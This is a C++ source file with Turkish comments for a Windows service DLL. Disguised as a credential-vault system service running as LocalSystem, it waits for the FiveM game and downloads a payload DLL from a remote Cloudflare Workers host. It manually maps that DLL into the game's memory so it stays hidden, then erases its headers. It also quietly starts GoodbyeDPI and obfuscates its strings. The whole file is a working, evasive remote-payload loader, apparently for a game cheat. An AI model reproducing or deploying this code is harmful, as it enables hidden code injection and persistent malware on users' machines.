// ============================================================
//  crVaultSvc.dll — Windows Service DLL (svchost.exe host)
//  SERVICE_WIN32_SHARE_PROCESS | LocalSystem
//  Exports: ServiceMain
//
//  Akış:
//    svchost.exe -k LocalSecurityCore → ServiceMain export çağrılır
//    → FiveM açılışını bekler → VDS'den SpCrashReport.dll indirir
//    → ManualMap ile FiveM'e inject eder → FiveM kapanana kadar izler
//    → FiveM tekrar açılırsa yeniden inject eder
// ============================================================

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <Windows.h>
#include <TlHelp32.h>
#include <winhttp.h>
#include <vector>
#include <string>
#include <atomic>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "user32.lib")

// ─── Cloudflare Workers bağlantı bilgileri (HTTPS) ─────────────────────────────
static const wchar_t* C0 = L"moon-auth-service.moonsal.workers.dev";
static const WORD      C1 = 443;
static const wchar_t*  C2 = L"/download/payload";

// ─── Service control state ───────────────────────────────────────────────────
static SERVICE_STATUS_HANDLE g_hSvc   = nullptr;
static SERVICE_STATUS        g_ss     = {};
static std::atomic<bool>     g_run    { true };

// ─── Runtime string builders (bellekte düz literal görünmesin) ───────────────

// "CredentialVaultSvc" — servis iç adı
static void BuildSvcNameW(wchar_t* out, size_t n) {
    const wchar_t s[] = {
        'C','r','e','d','e','n','t','i','a','l',
        'V','a','u','l','t','S','v','c',0
    };
    wcsncpy_s(out, n, s, _TRUNCATE);
}

// "PresenterCoreHost" — overlay pencere sınıfı (D3DHelper yerine)
static const char* OverlayClass() {
    static char s[20] = {};
    if (!s[0]) {
        s[0]='P'; s[1]='r'; s[2]='e'; s[3]='s'; s[4]='e';
        s[5]='n'; s[6]='t'; s[7]='e'; s[8]='r'; s[9]='C';
        s[10]='o'; s[11]='r'; s[12]='e'; s[13]='H'; s[14]='o';
        s[15]='s'; s[16]='t'; s[17]=0;
    }
    return s;
}

// "Local\RPCSS_<pid>" — sentinel mutex
static void BuildMutex(wchar_t* out, size_t n, DWORD pid) {
    wchar_t pfx[] = { 'L','o','c','a','l','\\','R','P','C','S','S','_',0 };
    swprintf_s(out, n, L"%s%lu", pfx, pid);
}

// ─── FiveM process bul ───────────────────────────────────────────────────────
// grcWindow = FiveM'in pencere sınıfı — bellekte düz literal görünmesin
static DWORD FindFiveM() {
    char cls[10] = {
        'g','r','c','W','i','n','d','o','w',0
    };
    HWND h = FindWindowA(cls, nullptr);
    if (!h) return 0;
    DWORD pid = 0;
    GetWindowThreadProcessId(h, &pid);
    return pid;
}

// ─── DLL zaten inject edilmiş mi? ───────────────────────────────────────────
// Sentinel: DllMain'de Local\RPCSS_<PID> mutex açılır + overlay penceresi
static bool IsDllLoaded(DWORD pid) {
    wchar_t name[64] = {};
    BuildMutex(name, 64, pid);
    HANDLE h = OpenMutexW(SYNCHRONIZE, FALSE, name);
    if (!h) return false;
    CloseHandle(h);
    // Mutex var — overlay penceresi de çalışıyor mu?
    return FindWindowA(OverlayClass(), nullptr) != nullptr;
}

// ─── VDS'den indir ───────────────────────────────────────────────────────────
static std::vector<BYTE> Fetch() {
    std::vector<BYTE> buf;
    HINTERNET hS = WinHttpOpen(L"Mozilla/5.0",
        WINHTTP_ACCESS_TYPE_NO_PROXY, nullptr, nullptr, 0);
    if (!hS) return buf;

    DWORD tmOut = 15000;
    WinHttpSetOption(hS, WINHTTP_OPTION_CONNECT_TIMEOUT, &tmOut, sizeof(tmOut));
    WinHttpSetOption(hS, WINHTTP_OPTION_SEND_TIMEOUT,    &tmOut, sizeof(tmOut));
    WinHttpSetOption(hS, WINHTTP_OPTION_RECEIVE_TIMEOUT, &tmOut, sizeof(tmOut));

    HINTERNET hC = WinHttpConnect(hS, C0, C1, 0);
    if (!hC) { WinHttpCloseHandle(hS); return buf; }

    HINTERNET hR = WinHttpOpenRequest(hC, L"GET", C2,
        nullptr, nullptr, nullptr, WINHTTP_FLAG_SECURE);
    if (!hR) { WinHttpCloseHandle(hC); WinHttpCloseHandle(hS); return buf; }

    if (WinHttpSendRequest(hR, nullptr, 0, nullptr, 0, 0, 0) &&
        WinHttpReceiveResponse(hR, nullptr)) {
        BYTE t[8192]; DWORD r = 0;
        while (WinHttpReadData(hR, t, sizeof(t), &r) && r)
            buf.insert(buf.end(), t, t + r);
    }
    WinHttpCloseHandle(hR); WinHttpCloseHandle(hC); WinHttpCloseHandle(hS);
    return buf;
}

// ════════════════════════════════════════════════════════════════════════════
//  MANUAL MAPPER — DLL disk'e yazılmadan FiveM RAM'ine map'lenir
//  LoadLibraryW çağrısı yok → modül listesinde görünmez
// ════════════════════════════════════════════════════════════════════════════
static bool ManualMap(HANDLE hProc, const std::vector<BYTE>& raw) {
    if (raw.size() < sizeof(IMAGE_DOS_HEADER)) return false;
    auto* dos = (const IMAGE_DOS_HEADER*)raw.data();
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
    if ((size_t)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS64) > raw.size()) return false;

    auto* nt = (const IMAGE_NT_HEADERS64*)(raw.data() + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return false;
    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) return false;

    DWORD imageSize   = nt->OptionalHeader.SizeOfImage;
    DWORD hdrSize     = nt->OptionalHeader.SizeOfHeaders;
    WORD  numSections = nt->FileHeader.NumberOfSections;

    std::vector<BYTE> image(imageSize, 0);
    if (hdrSize > imageSize || hdrSize > raw.size()) return false;
    memcpy(image.data(), raw.data(), hdrSize);

    auto* sec = (const IMAGE_SECTION_HEADER*)(
        (const BYTE*)nt + sizeof(IMAGE_NT_HEADERS64));
    for (WORD i = 0; i < numSections; i++) {
        if (!sec[i].SizeOfRawData || !sec[i].PointerToRawData) continue;
        if (sec[i].PointerToRawData + sec[i].SizeOfRawData > raw.size()) continue;
        if (sec[i].VirtualAddress + sec[i].SizeOfRawData > imageSize)    continue;
        memcpy(image.data() + sec[i].VirtualAddress,
               raw.data()   + sec[i].PointerToRawData,
               sec[i].SizeOfRawData);
    }

    // Uzak process'te bellek tahsis et
    LPVOID remBase = VirtualAllocEx(hProc,
        (LPVOID)nt->OptionalHeader.ImageBase, imageSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remBase)
        remBase = VirtualAllocEx(hProc, nullptr, imageSize,
                                 MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remBase) return false;

    // Relocation düzelt
    DWORD_PTR delta = (DWORD_PTR)remBase - nt->OptionalHeader.ImageBase;
    if (delta) {
        const auto& rDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (rDir.VirtualAddress && rDir.Size) {
            DWORD rva = rDir.VirtualAddress;
            DWORD end = rva + rDir.Size;
            while (rva < end) {
                auto* blk = (const IMAGE_BASE_RELOCATION*)(image.data() + rva);
                if (!blk->VirtualAddress || blk->SizeOfBlock < sizeof(*blk)) break;
                DWORD cnt = (blk->SizeOfBlock - sizeof(*blk)) / sizeof(WORD);
                auto* ent = (const WORD*)(blk + 1);
                for (DWORD j = 0; j < cnt; j++) {
                    if ((ent[j] >> 12) == IMAGE_REL_BASED_DIR64) {
                        DWORD off = blk->VirtualAddress + (ent[j] & 0xFFF);
                        if (off + 8 <= imageSize)
                            *(DWORD_PTR*)(image.data() + off) += delta;
                    }
                }
                rva += blk->SizeOfBlock;
            }
        }
    }

    // IAT (Import Address Table) çöz
    // Bulunamayan fonksiyonlar için NOP stub kullan → process crash etmez
    static const BYTE nopStub[] = {
        0x48,0x83,0xEC,0x28, 0x33,0xC0, 0x48,0x83,0xC4,0x28, 0xC3
    };
    LPVOID stubPage = VirtualAllocEx(hProc, nullptr, sizeof(nopStub),
                                     MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READ);
    if (stubPage)
        WriteProcessMemory(hProc, stubPage, nopStub, sizeof(nopStub), nullptr);

    const auto& iDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (iDir.VirtualAddress && iDir.Size) {
        auto* imp = (const IMAGE_IMPORT_DESCRIPTOR*)(image.data() + iDir.VirtualAddress);
        for (; imp->Name; imp++) {
            const char* dllName = (const char*)(image.data() + imp->Name);
            HMODULE hMod = LoadLibraryA(dllName);

            auto* thunk = (IMAGE_THUNK_DATA64*)(image.data() + imp->FirstThunk);
            auto* orig  = imp->OriginalFirstThunk
                ? (const IMAGE_THUNK_DATA64*)(image.data() + imp->OriginalFirstThunk)
                : (const IMAGE_THUNK_DATA64*)(image.data() + imp->FirstThunk);

            for (; orig->u1.AddressOfData; orig++, thunk++) {
                FARPROC fn = nullptr;
                if (hMod) {
                    if (IMAGE_SNAP_BY_ORDINAL64(orig->u1.Ordinal))
                        fn = GetProcAddress(hMod, MAKEINTRESOURCEA(IMAGE_ORDINAL64(orig->u1.Ordinal)));
                    else {
                        auto* ibn = (const IMAGE_IMPORT_BY_NAME*)(image.data() + orig->u1.AddressOfData);
                        fn = GetProcAddress(hMod, ibn->Name);
                    }
                }
                thunk->u1.Function = fn ? (ULONGLONG)fn
                                        : (stubPage ? (ULONGLONG)stubPage : 0);
            }
        }
    }

    // Düzeltilmiş image'ı uzak process'e yaz
    WriteProcessMemory(hProc, remBase, image.data(), imageSize, nullptr);

    if (!nt->OptionalHeader.AddressOfEntryPoint) return true;

    ULONGLONG dllMain = (ULONGLONG)remBase + nt->OptionalHeader.AddressOfEntryPoint;
    ULONGLONG base64  = (ULONGLONG)remBase;

    // PDATA → RtlAddFunctionTable → x64 SEH çalışsın
    const auto& edDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
    ULONGLONG pdataBase  = (edDir.VirtualAddress && edDir.Size)
                         ? (base64 + edDir.VirtualAddress) : 0;
    ULONGLONG pdataCount = pdataBase ? (edDir.Size / 12ULL) : 0;

    ULONGLONG rtlFT = (ULONGLONG)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "RtlAddFunctionTable");

    LPVOID stubMem = nullptr;
    HANDLE hT      = nullptr;

    if (pdataBase && pdataCount && rtlFT) {
        BYTE stub[81] = {
            0x48,0x83,0xEC,0x28,
            0x48,0xB9, 0,0,0,0,0,0,0,0,   // mov rcx, pdataBase  (+6)
            0x48,0xBA, 0,0,0,0,0,0,0,0,   // mov rdx, pdataCount (+16)
            0x49,0xB8, 0,0,0,0,0,0,0,0,   // mov r8,  base64     (+26)
            0x48,0xB8, 0,0,0,0,0,0,0,0,   // mov rax, rtlFT      (+36)
            0xFF,0xD0,
            0x48,0xB9, 0,0,0,0,0,0,0,0,   // mov rcx, base64     (+48)
            0xBA,0x01,0x00,0x00,0x00,      // mov edx, 1
            0x45,0x33,0xC0,                // xor r8d, r8d
            0x48,0xB8, 0,0,0,0,0,0,0,0,   // mov rax, dllMain    (+66)
            0xFF,0xD0,
            0x48,0x83,0xC4,0x28,
            0xC3
        };
        memcpy(stub +  6, &pdataBase,  8);
        memcpy(stub + 16, &pdataCount, 8);
        memcpy(stub + 26, &base64,     8);
        memcpy(stub + 36, &rtlFT,      8);
        memcpy(stub + 48, &base64,     8);
        memcpy(stub + 66, &dllMain,    8);

        stubMem = VirtualAllocEx(hProc, nullptr, sizeof(stub),
                                 MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (stubMem) WriteProcessMemory(hProc, stubMem, stub, sizeof(stub), nullptr);
    } else {
        BYTE stub[39] = {
            0x48,0x83,0xEC,0x28,
            0x48,0xB9, 0,0,0,0,0,0,0,0,   // mov rcx, base64  (+6)
            0xBA,0x01,0x00,0x00,0x00,      // mov edx, 1
            0x45,0x33,0xC0,                // xor r8d, r8d
            0x48,0xB8, 0,0,0,0,0,0,0,0,   // mov rax, dllMain (+24)
            0xFF,0xD0,
            0x48,0x83,0xC4,0x28,
            0xC3
        };
        memcpy(stub +  6, &base64,  8);
        memcpy(stub + 24, &dllMain, 8);

        stubMem = VirtualAllocEx(hProc, nullptr, sizeof(stub),
                                 MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (stubMem) WriteProcessMemory(hProc, stubMem, stub, sizeof(stub), nullptr);
    }

    if (!stubMem) return false;

    hT = CreateRemoteThread(hProc, nullptr, 0,
        (LPTHREAD_START_ROUTINE)stubMem, nullptr, 0, nullptr);
    if (hT) {
        WaitForSingleObject(hT, 15000);
        CloseHandle(hT);
        BYTE zeros[0x1000] = {};
        WriteProcessMemory(hProc, remBase, zeros, sizeof(zeros), nullptr);
    }
    VirtualFreeEx(hProc, stubMem, 0, MEM_RELEASE);
    return (hT != nullptr);
}

// ─── SetServiceStatus yardımcısı ─────────────────────────────────────────────
static void ReportStatus(DWORD state, DWORD exitCode = NO_ERROR,
                         DWORD hint = 0) {
    g_ss.dwCurrentState  = state;
    g_ss.dwWin32ExitCode = exitCode;
    g_ss.dwWaitHint      = hint;
    if (state != SERVICE_START_PENDING) g_ss.dwCheckPoint = 0;
    else                                ++g_ss.dwCheckPoint;
    if (g_hSvc) SetServiceStatus(g_hSvc, &g_ss);
}

// ─── GoodbyeDPI yönetimi ─────────────────────────────────────────────────────
// Arama sırası: svc_dll.dll yanı → %PROGRAMFILES%\GoodbyeDPI → Masaüstü
static std::wstring FindGoodbyeDPIPath() {
    static const wchar_t* cands[] = {
        L"C:\\Users\\tron\\Desktop\\GoodbyeDPI\\goodbyedpi.exe",
        L"C:\\GoodbyeDPI\\goodbyedpi.exe",
        L"C:\\Program Files\\GoodbyeDPI\\goodbyedpi.exe",
        L"C:\\Tools\\goodbyedpi.exe",
        nullptr
    };
    for (int i = 0; cands[i]; ++i) {
        if (GetFileAttributesW(cands[i]) != INVALID_FILE_ATTRIBUTES)
            return std::wstring(cands[i]);
    }
    return L"";
}

static DWORD FindGoodbyeDPIPid() {
    DWORD pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe = {}; pe.dwSize = sizeof(pe);
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"goodbyedpi.exe") == 0) {
                pid = pe.th32ProcessID; break;
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return pid;
}

static void StopGoodbyeDPI() {
    DWORD pid = FindGoodbyeDPIPid();
    if (!pid) return;
    HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (h) { TerminateProcess(h, 0); CloseHandle(h); }
}

static void StartGoodbyeDPI() {
    if (FindGoodbyeDPIPid()) return;  // zaten çalışıyor
    std::wstring path = FindGoodbyeDPIPath();
    if (path.empty()) return;

    // Dizini al (goodbyedpi.exe → dizin yolu)
    std::wstring dir = path;
    auto sl = dir.rfind(L'\\');
    if (sl != std::wstring::npos) dir.resize(sl);

    STARTUPINFOW si = {}; si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {};
    // -4 = minimal preset (anti-censorship, minimal overhead)
    std::wstring cmd = L"\"" + path + L"\" -4";
    if (CreateProcessW(nullptr, &cmd[0], nullptr, nullptr, FALSE,
                       CREATE_NO_WINDOW, nullptr, dir.c_str(), &si, &pi)) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
}

// ─── Ana inject döngüsü ───────────────────────────────────────────────────────
static void SvcLoop() {
    DWORD injectedPid = 0;
    bool  gdpiWasUp   = false;  // GoodbyeDPI'nın FiveM açıkken başlatıldığını izle

    while (g_run) {
        Sleep(2000);

        // ── Inject edilmiş FiveM hâlâ yaşıyor mu? ──────────────────────────
        if (injectedPid) {
            HANDLE hA = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,
                                    FALSE, injectedPid);
            bool alive = false;
            if (hA) {
                DWORD code = 0;
                alive = GetExitCodeProcess(hA, &code) && (code == STILL_ACTIVE);
                CloseHandle(hA);
            }
            // Alive + overlay aktif → devam et
            if (alive && IsDllLoaded(injectedPid)) continue;
            // FiveM kapandı veya DLL öldü → GoodbyeDPI'yı da kapat
            injectedPid = 0;
            if (gdpiWasUp) { StopGoodbyeDPI(); gdpiWasUp = false; }
            Sleep(1000);
            continue;
        }

        // ── FiveM'i bul ─────────────────────────────────────────────────────
        DWORD pid = FindFiveM();
        if (!pid) continue;

        // Zaten inject edilmiş mi?
        if (IsDllLoaded(pid)) { injectedPid = pid; continue; }

        // FiveM hâlâ yaşıyor mu? (son kontrol)
        {
            HANDLE hC = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
            if (!hC) continue;
            DWORD code = 0;
            bool ok = GetExitCodeProcess(hC, &code) && (code == STILL_ACTIVE);
            CloseHandle(hC);
            if (!ok) continue;
        }

        // ── Cloudflare Workers'dan SpCrashReport.dll indir ────────────────
        auto payload = Fetch();
        if (payload.empty()) { Sleep(5000); continue; }

        // ── ManualMap ile FiveM'e inject et ────────────────────────────────
        // LocalSystem olduğu için PROCESS_ALL_ACCESS her zaman açılır.
        HANDLE hP = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (!hP) continue;

        bool ok = ManualMap(hP, payload);
        CloseHandle(hP);
        if (!ok) continue;

        // DllMain'in sentinel mutex'i açmasını bekle
        Sleep(2500);
        if (IsDllLoaded(pid)) {
            injectedPid = pid;
            // FiveM canlı ve hile aktif → GoodbyeDPI'yı başlat
            // Bug #13 fix: FiveM her açılışında GoodbyeDPI yeniden başlatılır
            StartGoodbyeDPI();
            gdpiWasUp = true;
        }
    }
}

// ─── Service Control Handler ─────────────────────────────────────────────────
static void WINAPI SvcCtrl(DWORD ctrl) {
    switch (ctrl) {
    case SERVICE_CONTROL_STOP:
    case SERVICE_CONTROL_SHUTDOWN:
        ReportStatus(SERVICE_STOP_PENDING, NO_ERROR, 4000);
        g_run = false;
        break;
    case SERVICE_CONTROL_INTERROGATE:
        SetServiceStatus(g_hSvc, &g_ss);
        break;
    }
}

// ─── ServiceMain (export) ─────────────────────────────────────────────────────
extern "C" __declspec(dllexport)
void WINAPI ServiceMain(DWORD /*dwArgc*/, LPWSTR* /*lpszArgv*/) {
    wchar_t svcName[32] = {};
    BuildSvcNameW(svcName, 32);

    g_hSvc = RegisterServiceCtrlHandlerW(svcName, SvcCtrl);
    if (!g_hSvc) return;

    g_ss.dwServiceType      = SERVICE_WIN32_SHARE_PROCESS;
    g_ss.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ReportStatus(SERVICE_START_PENDING, NO_ERROR, 3000);

    // Başlangıç gecikmesi — sistem servisler yüklensin
    Sleep(3000);

    ReportStatus(SERVICE_RUNNING);

    SvcLoop();

    ReportStatus(SERVICE_STOPPED);
}

// ─── DllMain ─────────────────────────────────────────────────────────────────
BOOL APIENTRY DllMain(HMODULE hMod, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_ATTACH)
        DisableThreadLibraryCalls(hMod);
    return TRUE;
}
